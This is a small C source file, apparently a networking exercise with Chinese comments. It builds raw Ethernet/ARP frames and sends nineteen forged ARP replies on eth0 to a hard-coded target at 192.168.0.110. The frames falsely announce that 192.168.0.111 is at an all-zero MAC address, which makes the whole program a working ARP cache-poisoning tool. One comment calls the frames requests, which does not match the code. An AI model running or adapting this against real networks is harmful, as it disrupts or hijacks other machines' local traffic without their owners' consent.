#include<stdio.h>
#include<sys/socket.h>
#include<netinet/ether.h>
#include <sys/ioctl.h>//ioctl
#include <net/if.h>//struct ifreq
#include <netpacket/packet.h>//struct sockaddr_ll
#include<unistd.h>//_exit
#include<string.h>//strncpy
#include <net/ethernet.h>//struct ether_header
#include <net/if_arp.h>//struct arphdr
void my_sendto(int sockfd, char *out, unsigned char *msg, int msg_len);

int main()
{
	//1、创建原始套接字
	int sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(sockfd < 0)
	{
		perror("socket");
		return 0;
	}
	
	/*目的mac地址 XPmac*/
	unsigned char dst_mac[6]={0x70,0x5A,0x0F,0x63,0xF5,0x9D};
	unsigned char src_mac[6]={0x00};
	unsigned char src_ip[4]={192,168,0,111};
	unsigned char dst_ip[4]={192,168,0,110};
	
	unsigned char msg[1024]="";
	//1、组mac头部
	struct ether_header *eth_addr = (struct ether_header *)msg;
	//赋值目的mac地址
	memcpy(eth_addr->ether_dhost, dst_mac, 6);
	//赋值源mac地址
	memcpy(eth_addr->ether_shost, src_mac, 6);
	//赋值帧类型
	eth_addr->ether_type = htons(0x0806);
	
	//2、组arp头部
	struct arphdr *arp_head = (struct arphdr *)(msg+14);
	arp_head->ar_hrd = htons(1);
	arp_head->ar_pro = htons(0x0800);
	arp_head->ar_hln = 6;
	arp_head->ar_pln = 4;
	arp_head->ar_op = htons(2);
	memcpy(arp_head->__ar_sha, src_mac,6);
	memcpy(arp_head->__ar_sip, src_ip,4);
	memcpy(arp_head->__ar_tha, dst_mac,6);
	memcpy(arp_head->__ar_tip, dst_ip,4);
	
	//发送arp请求帧数据
	int i=0;
	for(i=1;i<20;i++)
	{
		my_sendto(sockfd, "eth0",msg, 42);
		sleep(1);
	}
	
	
	close(sockfd);
	return 0;
}
void my_sendto(int sockfd, char *out, unsigned char *msg, int msg_len)
{
	//通过ioctl得到网络接口
	struct ifreq ethreq;
	strncpy(ethreq.ifr_name, out, IFNAMSIZ);
	if(-1 == ioctl(sockfd, SIOCGIFINDEX, &ethreq))
	{
		perror("ioctl");
		close(sockfd);
		_exit(-1);
	}
	
	//帧数据 出去的本地接口
	struct sockaddr_ll sll;
	bzero(&sll,sizeof(sll));
	sll.sll_ifindex = ethreq.ifr_ifindex;
	//2、发送组好报文的帧数据
	sendto(sockfd, msg, msg_len, 0, (struct sockaddr *)&sll, sizeof(sll));
}